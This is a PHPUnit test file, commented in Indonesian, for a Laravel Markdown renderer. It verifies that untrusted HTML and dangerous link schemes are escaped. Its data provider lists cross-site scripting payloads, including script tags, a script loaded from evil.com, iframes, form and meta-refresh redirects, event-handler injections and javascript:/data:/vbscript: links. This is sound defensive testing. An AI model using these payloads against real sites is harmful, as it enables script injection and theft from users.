<?php

namespace Tests\Unit;

use App\Support\MarkdownRenderer;
use Tests\TestCase;

/**
 * Test untuk MarkdownRenderer.
 *
 * Fokus utama: memastikan HTML dari hasil konversi PDF (yang tidak kita
 * percaya) TIDAK PERNAH bisa dieksekusi sebagai HTML di browser.
 */
class MarkdownRendererTest extends TestCase
{
    private MarkdownRenderer $renderer;

    protected function setUp(): void
    {
        parent::setUp();

        $this->renderer = new MarkdownRenderer;
    }

    // =========================================================
    // Render Markdown dasar
    // =========================================================

    public function test_render_judul(): void
    {
        $this->assertSame('<h1>Judul Utama</h1>', $this->renderer->toHtml('# Judul Utama'));
        $this->assertSame('<h2>Sub Judul</h2>', $this->renderer->toHtml('## Sub Judul'));
        $this->assertSame('<h3>Sub Sub</h3>', $this->renderer->toHtml('### Sub Sub'));
    }

    public function test_render_paragraf(): void
    {
        $this->assertSame(
            "<p>Ini paragraf pertama.</p>\n<p>Ini paragraf kedua.</p>",
            $this->renderer->toHtml("Ini paragraf pertama.\n\nIni paragraf kedua."),
        );
    }

    public function test_render_garis_horizontal(): void
    {
        $this->assertSame('<hr>', $this->renderer->toHtml('---'));
        $this->assertSame('<hr>', $this->renderer->toHtml('***'));
    }

    public function test_render_list_tidak_bernomor(): void
    {
        $this->assertSame(
            '<ul><li>Beli buku</li><li>Jual buku</li></ul>',
            $this->renderer->toHtml("- Beli buku\n- Jual buku"),
        );
    }

    public function test_render_list_bernomor(): void
    {
        $this->assertSame(
            '<ol><li>Pertama</li><li>Kedua</li></ol>',
            $this->renderer->toHtml("1. Pertama\n2. Kedua"),
        );
    }

    public function test_render_format_inline(): void
    {
        $this->assertSame('<p><strong>tebal</strong></p>', $this->renderer->toHtml('**tebal**'));
        $this->assertSame('<p><em>miring</em></p>', $this->renderer->toHtml('*miring*'));
        $this->assertSame('<p><del>coret</del></p>', $this->renderer->toHtml('~~coret~~'));
    }

    public function test_render_kode_sebaris_tidak_diformat_ulang(): void
    {
        // Isi di dalam `backtick` harus tetap apa adanya.
        $this->assertSame(
            '<p><code>**tidak tebal**</code></p>',
            $this->renderer->toHtml('`**tidak tebal**`'),
        );
    }

    public function test_render_blok_kode(): void
    {
        $this->assertSame(
            "<pre><code>function tes() {\n  return 1;\n}</code></pre>",
            $this->renderer->toHtml("```\nfunction tes() {\n  return 1;\n}"),
        );
    }

    public function test_render_link_aman(): void
    {
        $this->assertSame(
            '<p><a href="https://laravel.com" rel="noopener noreferrer nofollow" target="_blank">Laravel</a></p>',
            $this->renderer->toHtml('[Laravel](https://laravel.com)'),
        );
    }

    public function test_karakter_markdown_spesial_di_escape(): void
    {
        // Teks yang mengandung < > & harus muncul sebagai teks.
        $this->assertSame(
            '<p>1 &lt; 2 &amp;&amp; 3 &gt; 2</p>',
            $this->renderer->toHtml('1 < 2 && 3 > 2'),
        );
    }

    public function test_markdown_tidak_dikenal_tetap_ditampilkan_apa_adanya(): void
    {
        $this->assertSame(
            '<p>Tanda ||Pipe|| dan ||Table||</p>',
            $this->renderer->toHtml('Tanda ||Pipe|| dan ||Table||'),
        );
    }

    // =========================================================
    // KEAMANAN: tidak ada HTML yang boleh lolos
    // =========================================================

    /**
     * @dataProvider htmlInjectionProvider
     */
    public function test_html_dari_dokumen_tidak_pernah_dijalankan(string $markdown): void
    {
        $this->assertNoUntrustedHtml($this->renderer->toHtml($markdown));
    }

    /**
     * Pemeriksaan keamanan yang BENAR.
     *
     * Catatan penting: assertion sederhana seperti
     * `assertStringNotContainsString('onerror', $html)` itu SALAH, karena
     * teks "onerror" yang sudah di-escape (`&lt;img onerror=x&gt;`) hanya
     * ditampilkan sebagai tulisan biasa dan sama sekali tidak berbahaya.
     *
     * Yang benar adalah: bandingkan tag HTML yang muncul dengan DAFTAR TAG
     * yang memang boleh dibuat oleh renderer, lalu pastikan tidak ada
     * "<" yang tersisa di luar tag-tag itu, dan tidak ada atribut
     * event handler (onclick, onerror, dst).
     */
    private function assertNoUntrustedHtml(string $html): void
    {
        // Tag yang memang boleh dibuat MarkdownRenderer.
        // Sengaja TIDAK ada "img": renderer ini tidak pernah membuat <img>,
        // jadi tag img yang muncul pasti datang dari dokumen dan berbahaya.
        $allowedTags = [
            'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'ul', 'ol', 'li', 'pre', 'code',
            'strong', 'em', 'del', 'blockquote', 'a', 'br', 'hr',
        ];

        // --- LANGKAH 1: setiap tag yang muncul harus dikenal dan
        //     hanya boleh punya atribut yang kita keluarkan sendiri. ---
        preg_match_all('#<([a-z0-9]+)((?:\s[^>]*)?)\s*/?>#i', $html, $matches, PREG_SET_ORDER);

        foreach ($matches as $tag) {
            $name = strtolower($tag[1]);
            $attributes = trim($tag[2]);

            $this->assertContains(
                $name,
                $allowedTags,
                "Tag <{$name}> bukan berasal dari renderer"
            );

            // Renderer ini hanya pernah menghasilkan href/rel/target pada <a>.
            // Atribut lain (onclick, style, src, dst) berarti kebocoran.
            $this->assertMatchesRegularExpression(
                '/^(?:\s+(?:href|rel|target)="[^"]*")*\s*$/i',
                $attributes,
                "Atribut tidak dikenal pada tag <{$name}>: {$attributes}"
            );
        }

        // --- LANGKAH 2: buang tag yang diizinkan. Sisanya harus teks
        //     biasa, tanpa tanda "<" atau ">" sama sekali. ---
        $stripPattern = '/<\/?('.implode('|', $allowedTags).')(\s[^>]*)?\/?>/i';
        $remainder = preg_replace($stripPattern, '', $html) ?? $html;

        $this->assertStringNotContainsString('<', $remainder, 'Ada tag HTML asing di hasil render');
        $this->assertStringNotContainsString('>', $remainder, 'Ada tag HTML asing di hasil render');

        // --- LANGKAH 3: setiap URL hanya boleh memakai skema aman. ---
        preg_match_all('/\b(?:href|src)="([^"]*)"/i', $html, $urls);

        foreach ($urls[1] as $url) {
            $this->assertDoesNotMatchRegularExpression(
                '/^\s*(javascript|data|vbscript)\s*:/i',
                $url,
                "Skema URL berbahaya pada atribut: {$url}"
            );
        }
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function htmlInjectionProvider(): array
    {
        return [
            'script tag' => ['<script>alert(1)</script>'],
            'script besar' => ['<SCRIPT SRC=//evil.com/x.js></SCRIPT>'],
            'img onerror' => ['<img src=x onerror=alert(1)>'],
            'iframe' => ['<iframe src="https://evil.com"></iframe>'],
            'svg onload' => ['<svg onload=alert(1)>'],
            'link stylesheet' => ['<link rel="stylesheet" href="https://evil.com/x.css">'],
            'form' => ['<form action="https://evil.com"><input name="a"></form>'],
            'object' => ['<object data="https://evil.com/x.swf"></object>'],
            'body onload' => ['<body onload=alert(1)>'],
            'style block' => ['<style>body{display:none}</style>'],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.com">'],

            // Link dengan skema berbahaya
            'link javascript' => ['[klik](javascript:alert(1))'],
            'link data' => ['[klik](data:text/html;base64,PHNjcmlwdD4=)'],
            'link vbscript' => ['[klik](vbscript:msgbox(1))'],
            'link javascript dengan spasi' => ['[klik]( javascript:alert(1))'],
            'link javascript dengan tab' => ["[klik](java\tscript:alert(1))"],

            // Disamarkan di dalam heading dan list
            'script di heading' => ['# <script>alert(1)</script>'],
            'script di list' => ['- <script>alert(1)</script>'],
            'script di kode' => ['```<script>alert(1)</script>```'],
        ];
    }

    public function test_script_dalam_blok_kode_di_escape(): void
    {
        $html = $this->renderer->toHtml("```\n<script>alert(1)</script>\n```");

        $this->assertStringContainsString('&lt;script&gt;', $html);
        $this->assertStringNotContainsString('<script>', $html);
    }

    public function test_teks_berbahaya_muncul_sebagai_teks_bukan_tag(): void
    {
        // "onerror" tetap tertulis di layar, TAPI tidak pernah menjadi atribut
        // tag HTML. Ini yang membedakan teks berbahaya dari HTML berbahaya.
        $html = $this->renderer->toHtml('<img src=x onerror=alert(1)>');

        $this->assertStringContainsString('onerror=alert(1)', $html);
        $this->assertStringContainsString('&lt;img', $html);
        $this->assertStringNotContainsString('<img', $html);
    }

    public function test_link_javascript_menampilkan_teks_saja(): void
    {
        $html = $this->renderer->toHtml('[klik](javascript:alert(1))');

        // Tidak boleh ada <a href="javascript:...">, teks link tetap tampil.
        $this->assertStringNotContainsString('<a', $html);
        $this->assertStringContainsString('klik', $html);
    }

    public function test_link_dengan_spasi_di_awal_url_tidak_menjadi_link(): void
    {
        // URL berisi spasi tidak cocok dengan pola link Markdown, jadi
        // seluruhnya ditampilkan sebagai teks biasa - dan tetap aman.
        $html = $this->renderer->toHtml('[klik]( javascript:alert(1))');

        $this->assertStringNotContainsString('<a', $html);
        $this->assertStringNotContainsString('href', $html);
    }

    public function test_link_berikutnya_setelah_link_berbahaya_aman(): void
    {
        $html = $this->renderer->toHtml('[jahat](javascript:alert(1)) [baik](https://laravel.com)');

        $this->assertStringNotContainsString('javascript:', $html);
        $this->assertStringContainsString('https://laravel.com', $html);
    }

    // =========================================================
    // Batas keamanan
    // =========================================================

    public function test_preview_panjang_dipotong(): void
    {
        $html = $this->renderer->toHtml(str_repeat('a', MarkdownRenderer::MAX_PREVIEW_LENGTH + 1000));

        $this->assertStringContainsString('preview dipotong', $html);
    }

    public function test_html_kosong(): void
    {
        $this->assertSame('', $this->renderer->toHtml(''));
        $this->assertSame('', $this->renderer->toHtml('   '));
    }
}
